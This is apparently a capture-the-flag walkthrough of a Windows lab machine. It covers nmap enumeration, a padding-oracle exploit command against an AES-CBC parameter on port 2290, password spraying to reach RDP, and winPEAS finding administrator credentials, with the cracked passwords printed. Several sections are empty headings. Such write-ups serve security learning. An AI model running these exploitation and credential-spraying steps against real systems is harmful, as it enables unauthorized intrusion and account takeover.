#Pwned
```IP
192.168.167.119
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.167.119 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 125 Microsoft ftpd       
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=utf-8).                 
|_http-server-header: Microsoft-IIS/10.0
| http-methods:                            
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  syn-ack ttl 125 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
2290/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods:                  
|   Supported Methods: OPTIONS TRACE GET HEAD POST    
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Microsoft-IIS/10.0     
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
5985/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

```

## HTTP 80
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219152843.png?raw=true)
## HTTP 2290
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219153318.png?raw=true)
We also find the next message
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219160514.png?raw=true)
```
AES-256-CBC-PKCS7 ciphertext: 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488

Victor's TODO: Need to add authentication eventually..
```
If you interact with the c parameter it will respond with a 0 with any string excepto for the ciphertext, which will retrieve a 1:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220094911.png?raw=true)
# Exploitation
Searching for AES-256-CBC-PKCS7 exploit we get the following github page which contains an exploit for the padding oracle attack.
https://github.com/mpgn/Padding-oracle-attack
```
python exploit.py -c '4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488' -l 16 --host 192.168.167.119:2290 -u /?c= -v --error '<span id="MyLabel">0</span>'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220095604.png?raw=true)
It cracked the password!
```
WormAloeVat7
```
Spraying the password we get access via RDP!

# PrivEsc

## Manual

## Automated

### Peass
If we run winpeas we will find some powershell events which haven't been deleted. They contain administrator credentials and the flag!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220100734.png?raw=true)
```
EverywayLabelWrap375
```
Indeed we can execute a powershell as administrator with the latter password, and assess that the flag is indeed the one retrieved by winpeas:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220101033.png?raw=true)
### Mimikatz

# Lateral Movement

